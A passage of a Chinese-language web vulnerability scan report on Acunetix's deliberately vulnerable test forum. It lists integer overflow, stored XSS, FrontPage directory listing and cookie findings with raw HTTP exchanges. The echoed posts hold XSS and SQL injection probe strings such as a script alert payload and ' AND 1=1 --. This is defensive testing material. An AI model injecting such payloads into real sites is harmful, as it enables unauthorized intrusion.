						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attIntegerOverflow">整數溢位</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_3">高</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">8.6</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/showthread.asp">http://testasp.vulnweb.com/showthread.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">id (Parameter)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能收集機密性除錯資訊</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未對送入的參數值執行適當的範圍檢查</li><li>未執行驗證，以確定使用者輸入符合預期的資料類型</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attIntegerOverflow_Adv">請驗證參數值是在預期的範圍內且為預期的類型。請勿輸出除錯錯誤訊息和異常狀況</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">應用程式已回應錯誤訊息，指出有未定義的狀態可能會顯現機密性資訊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /showthread.asp?<span class="mark">id=99999999999999999999</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/showforum.asp?id=0
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=KJAADCMBDOAHLOHGBDMAGNIB
Content-Length: 0


HTTP/1.1 <span class="highlight">500</span> Internal Server Error
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:35:06 GMT
Content-Length: 1208

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/&gt;
&lt;title&gt;500 - Internal server error.&lt;/title&gt;
&lt;style type="text/css"&gt;
&lt;!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div id="header"&gt;&lt;h1&gt;Server Error&lt;/h1&gt;&lt;/div&gt;
&lt;div id="content"&gt;
 &lt;div class="content-container"&gt;&lt;fieldset&gt;
  &lt;h2&gt;500 - Internal server error.&lt;/h2&gt;
  &lt;h3&gt;There is a problem with the resource you are looking for, and it cannot be displayed.&lt;/h3&gt;
 &lt;/fieldset&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</div></div><div id="GV_StoredXSS" class="issueType" xmlns=""><div class="severity severity_3">高</div><div><h2 class="nowordwrap"><a href="#GV_StoredXSS">預存的跨網站指令碼</a>
					 
					<span class="count">2</span><a name="GV_StoredXSS"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						2</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#GV_StoredXSS">預存的跨網站指令碼</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_3">高</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">7.1</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L" target="_blank">AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/showthread.asp">http://testasp.vulnweb.com/showthread.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">showthread.asp (Global)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能竊取或操作客戶階段作業和 Cookie，並可能用來假冒合法的使用者，讓駭客可以檢視或變更使用者記錄，以及用該使用者的身分來執行交易</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未正確地消毒使用者所輸入的危險字元</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#GV_StoredXSS_Adv">檢查危險字元注入可能的解決方案</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">發生以下情況之一：1. 測試結果似乎表明存在漏洞，因為全域驗證功能在回應中發現了嵌入的指令碼，這可能是先前測試注入的。測試成功地將指令碼嵌入到現有的 JavaScript 內容中。當原始指令碼執行時，注入的指令碼也會被執行。這意味著應用程式容易受到跨網站指令碼攻擊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /showthread.asp?id=0 HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/showforum.asp?id=0
Connection: keep-alive
<span class="mark">X-Forwarded-For: '</span>
Cookie: ASPSESSIONIDSQRQRDTS=AHIDJHPAOOCFFPFIHOADECKC
Content-Length: 0


HTTP/1.1 <span class="highlight">200</span> <span class="highlight">OK
Cache</span>-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:34:27 GMT
Content-Length: 6192


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum
Home page
&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu"&gt;SQL vuln help&lt;/a&gt;
    &lt;/div&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;!-- InstanceBeginEditable name="MainContentLeft" --&gt;
		&lt;div class="path"&gt;
			&lt;a href="showforum.asp?id=0"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;/Home page
		&lt;/div&gt;
      &lt;table width="100%" cellspacing="1" cellpadding="5" bgcolor="#E5E5E5"&gt;
        &lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;frenual&lt;/b&gt; on 1/13/2025 3:33:17 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;Home page - 80.239.178.67&lt;/div&gt;&lt;div class='posttext'&gt;https://kinozapas.io/ &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:00 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;J0o5Tx5s&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:00 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;&lt;/div&gt;&lt;scrIpt&gt;<span class="highlight">alert(37514)</span>;&lt;/scRipt&gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:07 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;'";'()(NULL&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:07 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;'";'()(NULL&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:07 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt; AND 1=1 -- &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:07 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;' AN
...
...
...
</div></div><div class="h3group" xmlns=""><h3>問題
						 
						2
						 
						/
						 
						2</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#GV_StoredXSS">預存的跨網站指令碼</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_3">高</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">7.1</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L" target="_blank">AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/showthread.asp">http://testasp.vulnweb.com/showthread.asp</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">id (Global)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能竊取或操作客戶階段作業和 Cookie，並可能用來假冒合法的使用者，讓駭客可以檢視或變更使用者記錄，以及用該使用者的身分來執行交易</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>未正確地消毒使用者所輸入的危險字元</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#GV_StoredXSS_Adv">檢查危險字元注入可能的解決方案</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">發生以下情況之一：1. 測試結果似乎表明存在漏洞，因為全域驗證功能在回應中發現了嵌入的指令碼，這可能是先前測試注入的。測試成功地將指令碼嵌入到現有的 JavaScript 內容中。當原始指令碼執行時，注入的指令碼也會被執行。這意味著應用程式容易受到跨網站指令碼攻擊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET /showthread.asp?id=0 HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Referer: http://testasp.vulnweb.com/showforum.asp?id=0
Connection: keep-alive
Cookie: ASPSESSIONIDQQQQQDST=IJNPCCMBHKLHBPMFKKCEMKNK
Content-Length: 0


HTTP/1.1 <span class="highlight">200</span> <span class="highlight">OK
Cache</span>-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:34:27 GMT
Content-Length: 6192


&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
&lt;html&gt;&lt;!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" --&gt;
&lt;head&gt;
&lt;!-- InstanceBeginEditable name="doctitle" --&gt;
&lt;title&gt;acuforum
Home page
&lt;/title&gt;
&lt;!-- InstanceEndEditable --&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;!-- InstanceBeginEditable name="head" --&gt;&lt;!-- InstanceEndEditable --&gt;
&lt;link href="styles.css" rel="stylesheet" type="text/css"&gt;
&lt;/head&gt;
&lt;body&gt; 
&lt;table width="100%"  border="0" cellpadding="10" cellspacing="0"&gt; 
  &lt;tr bgcolor="#008F00"&gt; 
    &lt;td width="306px"&gt;&lt;a href="https://www.acunetix.com/"&gt;&lt;img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"&gt;&lt;/a&gt;&lt;/td&gt; 
    &lt;td align="right" valign="middle" bgcolor="#008F00" class="disclaimer"&gt;TEST and Demonstration site for &lt;a href="https://www.acunetix.com/vulnerability-scanner/"&gt;Acunetix Web Vulnerability Scanner&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
    &lt;td colspan="2"&gt;&lt;div class="menubar"&gt;&lt;a href="Templatize.asp?item=html/about.html" class="menu"&gt;about&lt;/a&gt; - &lt;a href="Default.asp" class="menu"&gt;forums&lt;/a&gt; - &lt;a href="Search.asp" class="menu"&gt;search&lt;/a&gt; 
     - &lt;a href="./Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0" class="menu"&gt;login&lt;/a&gt; - &lt;a href="./Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0" class="menu"&gt;register&lt;/a&gt; 
	- &lt;a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu"&gt;SQL scanner&lt;/a&gt; - &lt;a href="https://www.acunetix.com/websitesecurity/sql-injection/" cl
...
...
...

        &lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;frenual&lt;/b&gt; on 1/13/2025 3:33:17 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;Home page - 80.239.178.67&lt;/div&gt;&lt;div class='posttext'&gt;https://kinozapas.io/ &lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:00 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;J0o5Tx5s&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:00 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;&lt;/div&gt;&lt;scrIpt&gt;<span class="highlight">alert(37514)</span>;&lt;/scRipt&gt;&lt;div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:07 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;'";'()(NULL&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:07 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt;'";'()(NULL&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign='top' align='center' bgcolor='#FFFFFF' width='120'&gt;&lt;img src='avatars/noavatar.gif'&gt;&lt;br&gt;posted by &lt;b&gt;Pedro Miguel&lt;/b&gt; on 1/13/2025 6:27:07 AM&lt;/td&gt;&lt;td valign='top' bgcolor='#FFFFFF'&gt;&lt;div class='posttitle'&gt;This is a subject - 44.209.217.93&lt;/div&gt;&lt;div class='posttext'&gt; AND 1=1 -- &lt;/div&gt;&lt;/td
...
...
...

&lt;/table&gt; 
&lt;div style="background-color:lightgray;width:80%;margin:auto;text-align:center;font-size:12px;padding:1px"&gt;
	&lt;p style="padding-left:20%;padding-right:20%"&gt;&lt;b&gt;Warning&lt;/b&gt;: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and d<span class="mark">o not follow links that are post</span>ed by malicious parties.&lt;/p&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;!-- InstanceEnd --&gt;&lt;/html&gt;

...
...
...</div></div>
				 
				
				<input type="hidden" name="sectionstart" xmlns="" />
				 
				
			<div id="attVtiCnf" class="issueType" xmlns=""><div class="severity severity_2">中</div><div><h2 class="nowordwrap"><a href="#attVtiCnf">Microsoft FrontPage 目錄清單</a>
					 
					<span class="count">1</span><a name="attVtiCnf"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						1</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attVtiCnf">Microsoft FrontPage 目錄清單</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_2">中</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">6.5</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N" target="_blank">AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">_vti_cnf/ (Page)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>有可能檢視及下載某些 Web 應用程式虛擬目錄的內容，其可能包含受限的檔案</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>已使用不適當的安全設定來安裝 FrontPage Server Extensions</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attVtiCnf_Adv">修改伺服器配置來拒絕存取含有機密性資訊的目錄</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">回應包含 _vti_cnf 目錄的內容（目錄清單），這是由 FrontPage 所建立的輔助目錄。這表示伺服器的配置錯誤，且允許目錄的清單。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET <span class="mark">/_vti_cnf/</span> HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:49:12 GMT
Content-Length: 926
Set-Cookie: ASPSESSIONIDQQQQQDST=JFPEDCMBODHIOOFBKJEDNLMI; path=/

vti_encoding:SR|utf8-nl
vti_timelastmodified:TR|05 Oct 2007 10:01:19 -0000
vti_extenderversion:SR|4.0.2.8912
vti_cacheddtm:TX|05 Oct 2007 10:01:19 -0000
vti_filesize:IR|3663
vti_cachedlinkinfo:VX|Q|styles.css H|http://www.acunetix.com/ S|Images/logo.gif H|Templatize.asp H|Default.asp H|Search.asp
vti_cachedsvcrellinks:VX|FQUS|acuforum/styles.css NHHS|http://www.acunetix.com/ FSUS|acuforum/Images/logo.gif FHUS|acuforum/Templatize.asp FHUS|acuforum/Default.asp FHUS|acuforum/Search.asp
vti_cachedtitle:SR|acuforum forums
vti_title:SR|acuforum forums
vti_cachedbodystyle:SR|&lt;body&gt;
vti_cachedhasbots:BR|false
vti_cachedhastheme:BR|false
vti_cachedhasborder:BR|false
vti_metatags:VR|HTTP-EQUIV=Content-Type text/html;\\ charset=iso-8859-1
vti_backlinkinfo:VX|acuforum/login.asp acuforum/register.asp acuforum/search.asp acuforum/default.asp acuforum/showthread.asp acuforum/showforum.asp acuforum/templatize.asp
</div></div><div id="attSameSiteCookie" class="issueType" xmlns=""><div class="severity severity_2">中</div><div><h2 class="nowordwrap"><a href="#attSameSiteCookie">SameSite 屬性不安全、不適當或遺漏的 Cookie</a>
					 
					<span class="count">2</span><a name="attSameSiteCookie"></a></h2></div><div class="toclink"><a class="toclink" href="#toc">目錄</a></div></div><div class="h3group" xmlns=""><h3>問題
						 
						1
						 
						/
						 
						2</h3><a class="toclink" href="#toc">目錄</a></div><div class="issueHeader" xmlns=""><div class="headerIssueType"><a href="#attSameSiteCookie">SameSite 屬性不安全、不適當或遺漏的 Cookie</a></div><div class="row"><div class="name">嚴重性：</div><div class="value"><span class="box severity_2">中</span></div></div><div class="row"><div class="name">CVSS 評分：</div><div class="value">4.7</div></div><div class="row"><div class="name">CVSS 向量：</div><div class="value"><a class="cveUrl" href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:U/RL:O/RC:C" target="_blank">AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N/E:U/RL:O/RC:C/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</a></div></div><div class="row"><div class="name">URL：</div><div class="value wordBreaker"><a href="http://testasp.vulnweb.com/">http://testasp.vulnweb.com/</a></div></div><div class="row"><div class="name">實體：</div><div class="value wordBreaker">ASPSESSIONIDSQRQRDTS (Cookie)
						</div></div><div class="row"><div class="name">風險：</div><div class="value"><ul style="margin:0; padding:0"><li>將 Cookie 限制為第一方或相同網站環境定義以預防 Cookie 資訊洩漏。如果沒有設置額外的保護措施（如反 CSRF 記號），攻擊者可以延伸為偽造跨網站要求 (CSRF) 攻擊。</li></ul></div></div><div class="row"><div class="name">原因：</div><div class="value"><ul style="margin:0; padding:0"><li>SameSite 屬性不適當、不安全或遺漏的機密 Cookie</li></ul></div></div><div class="row"><div class="name">修正：</div><div class="value"><a href="#attSameSiteCookie_Adv">檢閱將 SameSite Cookie 屬性配置為建議值的可能解決方案</a></div></div></div><div class="variant" xmlns=""><div class="row"><div class="name">推論：</div><div class="value">回應包含 SameSite 屬性不安全、不適當或遺漏的機密 Cookie，這可能會導致 Cookie 資訊洩漏。如果沒有設置額外的保護措施，可能會衍生出偽造跨網站要求 (CSRF) 攻擊。</div></div><div class="name">測試要求和回應：</div><div class="code test">GET / HTTP/1.1
Host: testasp.vulnweb.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US
Connection: keep-alive
Content-Length: 0


HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html
Server: Microsoft-IIS/8.5
X-Powered-By: ASP.NET
Date: Wed, 05 Feb 2025 15:31:02 GMT
Content-Length: 3561
<span class="highlight">Set-Cookie: ASPSESSIONIDSQRQRDTS=FOJDJHPAJOPANKBBHKJKNADC; path=/</span>


